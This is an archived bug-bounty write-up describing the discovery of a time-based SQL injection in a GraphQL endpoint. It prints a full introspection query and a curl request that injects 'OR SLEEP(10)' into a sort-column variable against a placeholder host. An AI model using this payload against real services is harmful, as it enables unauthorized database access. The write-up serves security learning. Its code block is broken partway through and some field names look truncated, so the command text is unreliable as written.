# SQL Injection in GraphQL

- **Source URL:** https://0xgad.medium.com/sql-injection-in-graphql-2859c96547a8?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20221211044654/https://0xgad.medium.com/sql-injection-in-graphql-2859c96547a8?source=rss------bug_bounty-5
- **Fetched:** 2026-11-25
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/468 (id 468)
- **Method:** trafilatura readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# SQL Injection in GraphQL

Hello friends I’m Ahmed Gad This Is First Write-Up I Hope you like It

After Recon I got 403 in the subdomain

I Start FUZZ On Subdomain

I Got 500 Internal Server Error On Endpoint GraphQL

GraphQL Was Initially Developed and Used By Facebook as an Internal Query Language and so The Features of GraphQL Mostly Revolve Around Internal and Development Areas.

GraphQL Executes Queries Using a Type System With The Data Defined. An Important But Often Ignored Feature Of GraphQL Is The Ability To Ask GraphQL Schema About The Supported Queries With The Help Of Interospection Sytem

I will start in exploit

Given That There Are Some Situations Where You Don’t Know What Type You’ll Get Back From The GraphQL Service, You Need Some Way To Determine How To Handle That Data on The Client. GraphQL Allows You To Request \_\_typename, a Meta Field, at any Point In a Query To Get The Name Of The Object Type At That Point

The Following graphql GraphQL Is an Interospection Query That Completely Reveals The Defined System With All Required Details

`{"query": "query IntrospectionQuery {__schema {queryType { name },mutationType { name },subscriptionType { name },types {...FullType},directives {name,description,args {...InputValue},onOperation,onFragment,onField}}}\nfragment FullType on __Type {kind,name,description,fields(includeDeprecated: true) {name,description,args {...InputValue},type {...TypeRef},isDeprecated,deprecationReason},inputFields {...InputValue},interfaces {...TypeRef},enumValues(includeDeprecated: true) {name,description,isDeprecated,deprecationReason},possibleTypes {...TypeRef}}\nfragment InputValue on __InputValue {name,description,type { ...TypeRef },defaultValue}\nfragment TypeRef on __Type {kind,name,ofType {kind,name,ofType {kind,name,ofType {kind,name}}}}"}`

Run curl command with time and check the response time, sleep(10):

```
curl -i -s -k  -X $'POST' \
    -H $'Host: example.com' -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko/20100101 Firefox/68.0' -H $'Accept: */*' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Referer: http://example.com/dashboard' -H $'content-type: application/json' -H $'Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c' -H $'Origin: http://example.com' -H $'Content-Length: 663' -H $'DNT: 1' -H $'Connection: close' \
    --data-binary $'{"operationName":"pages","variables":{"offset":0,"limit":10,"sortc":"name 
```
**OR SLEEP(10)**","sortrev":false},"query":"query pages($offset: Int!, $limit: Int!, $sortc: String, $sortrev: Boolean) {\n  pages(offset: $offset, limit: $limit, sortc: $sortColumn, sortReverse: $sortReverse) {\n    id\n    n\n    __typen\n  }\n  me {\n    firstN\n    lastN\n    usern\n    __typen\n  }\n  components {\n    title\n    __typen\n  }\n  templates {\n    title\n    __typen\n  }\n  fonts {\n    n\n    __typen\n  }\n  partners {\n    id\n    n\n    banners {\n      n\n      __typen\n    }\n    __typen\n  }\n}\n"}' \
